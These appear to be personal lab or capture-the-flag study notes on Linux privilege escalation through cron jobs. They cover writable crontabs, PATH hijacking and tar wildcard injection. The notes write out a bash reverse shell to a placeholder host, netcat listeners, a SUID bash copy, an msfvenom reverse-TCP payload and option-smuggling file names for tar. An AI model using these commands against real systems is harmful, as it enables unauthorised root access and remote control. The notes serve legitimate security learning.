**Linpeas**
![image 164.png](../../Linux%20Checklist/assets/Cron%20Tabs/image%20164.png)
- if you are able to change any, you can easily get a root shell when the cron job runs (see cronos)
  

**LinEnum**
![](assets/Pasted%20image%2020260531153336.png)
  

**Scheduled Tasks**
if we can write to any of these and create tasks, should be an easy dub (bash script)
- /etc/crontab
- /etc/cron.d
- /var/spool/cron/crontabs/root



**Locations**
user > `/var/spool/cron/` or `/var/spool/cron/crontabs/`
system-wide > `/etc/crontab`


**File Permissions**
if we can write to a file or script that runs as a crontab, we can run our own code
- edit file and add a reverse shell
```
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<port> 0>&1
```
- remember to try common ports like 53

set up netcat listener
```
nc -lvnp <port>
```


**PATH Environment Variable**
crontab PATH is set to `/usr/bin:/bin` by default
- if a job doesn't use absolute paths, we can take it over

linenum letting us know this is possible (level 1)
![](assets/Pasted%20image%2020260531153628.png)

checking crontabs
![](assets/Pasted%20image%2020260531153705.png)
- can see "overwrite.sh" doesn't use an absolute path

create new "overwrite.sh"
```
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

wait for cron job to hit
![](assets/Pasted%20image%2020260531153833.png)

run rootbash
`/tmp/rootbash -p`



**Wildcards**
when a wildcard is provided, the expansion happens before the command is executed
- it is possible to pass command line options (e.g. `-h`) o commands by creating files with these names

the following commands will be used to show this functionality
```
ls *
touch .\-l
ls *
```

filenames are not restricted to simple options like `-h`
- can use complex options like `--option=key=value`
- GTFOBins can help determine whether a command has command line options which will be useful for this


**Wildcards Tar Example**
looking at crontab again
![](assets/Pasted%20image%2020260531154146.png)
- haven't looked at compress.sh yet

![](assets/Pasted%20image%2020260531154205.png)
- calls tar command with several options with a wildcard


GTFOBins shows a way to spawn a shell with cli options
![](assets/Pasted%20image%2020260531154241.png)

create shell with msfvenom
- `msfvenom -p linux/x64/shell reverse_tcp LHOST=<IP> LPORT=<port> -f elf -o shell.elf`

create two new files - these will become command line arguments when the wildcard hits
- `touch ./--checkpoint=1`
- `touch ./--checkpoint-action=exec=shell.elf`

set up netcat listener on kali and wait for cronjob to run
`nc -lvnp <port>`
